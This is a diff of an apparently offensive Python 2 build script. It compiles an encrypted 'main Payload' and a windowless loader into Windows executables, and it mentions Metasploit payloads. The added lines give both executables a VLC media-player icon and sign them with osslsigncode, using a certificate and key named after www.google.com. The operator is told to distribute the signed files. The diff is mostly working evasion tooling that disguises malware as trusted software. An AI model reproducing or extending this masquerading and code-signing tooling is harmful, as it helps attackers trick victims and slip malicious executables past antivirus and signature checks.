@@ -158,8 +158,9 @@ elif decision1 == 'Y':
     if dep_wine == True and (dep_arch == '32bit' or dep_arch =='64bits'):
       print bcolors.BOLD + bcolors.WHITE + "              [+] Wine Installed "
     else:
-        print bcolors.BOLD + bcolors.WHITE + "            [+] Installing Wine for x86 Arch"
+        print bcolors.BOLD + bcolors.WHITE + "            [+] Updating Wine and osslsigncode for x86 Arch"
         os.system('apt-get install wine -y')
+        os.system('apt-get install osslsigncode -y')
     if dep_wine64  == True and dep_arch == '64bit':
       print bcolors.BOLD + bcolors.WHITE + "              [+] Wine64 Installed "
     else:
@@ -205,21 +206,30 @@ with open("out1.py","w") as p1:
      for line in fileobj:
          p1.write(line)
 #p1.close()
-os.system('wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe -F --hidden-import "cryptography.*" --hidden-import Fernet --hidden-import os --hidden-import sys --hidden-import time --hidden-import cryptography --hidden-import code  --hidden-import shutil --runtime-hook script.py out1.py')
+os.system('wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe -F --icon=vlc.ico --hidden-import "cryptography.*" --hidden-import Fernet --hidden-import os --hidden-import sys --hidden-import time --hidden-import cryptography --hidden-import code  --hidden-import shutil --runtime-hook script.py out1.py')
 #CREATE_NO_WINDOW = 0x08000000
 #subprocess.call('wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe -F --noconsole --hidden-import "cryptography.*" --hidden-import Fernet --hidden-import os --hidden-import sys --hidden-import time --hidden-import cryptography --hidden-import code --hidden-import shutil --runtime-hook script.py out1.py', shell=False)												
 print bcolors.BOLD + bcolors.WHITE + "[+] Compilation Of main Payload Success............"
 
 print bcolors.BOLD + bcolors.WHITE + "[+] Compiling Loader , Please wait................."
 time.sleep(1)
-os.system('wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe -F --noconsole --hidden-import os --hidden-import sys --hidden-import time --hidden-import cryptography --hidden-import code --hidden-import shutil --hidden-import win32con --hidden-import win32gui --runtime-hook Loader_script.py loader.py')
+os.system('wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe -F --icon=vlc.ico --noconsole --hidden-import os --hidden-import sys --hidden-import time --hidden-import cryptography --hidden-import code --hidden-import shutil --hidden-import win32con --hidden-import win32gui --runtime-hook Loader_script.py loader.py')
 
 print bcolors.BOLD + bcolors.WHITE + "[+] Performing Cleanup Job, Please wait"
 
 os.system('rm out1.py out1.spec loader.spec loader.py')
 time.sleep(1) 
 
+print bcolors.BOLD + bcolors.ERROR + "[+] Signing Apps with  SHA256 certificate......Please Wait"
+time.sleep(1)
+os.system('osslsigncode sign -certs www.google.com.crt -key www.google.com.key -t http://timestamp.globalsign.com/scripts/timestamp.dll -in ./dist/out1.exe -out ./dist/out1signed.exe')
+os.system('osslsigncode sign -certs www.google.com.crt -key www.google.com.key -t http://timestamp.globalsign.com/scripts/timestamp.dll -in ./dist/loader.exe -out ./dist/loadersigned.exe')
+
+print bcolors.BOLD + bcolors.ERROR + "[+] Executables signed  Successfully"
+
 print bcolors.BOLD + bcolors.WHITE + "[+] Executable and Loader Located in the /dist Subfolder"
+print bcolors.BOLD + bcolors.ERROR + "[+] Please use the out1signed.exe and loadersigned.exe in the /dist Subfolder"
+
 #print bcolors.BOLD + bcolors.WHITE + "[+] Was the raw Payload provided, a MSF payload ? (Y/N)"
 
 
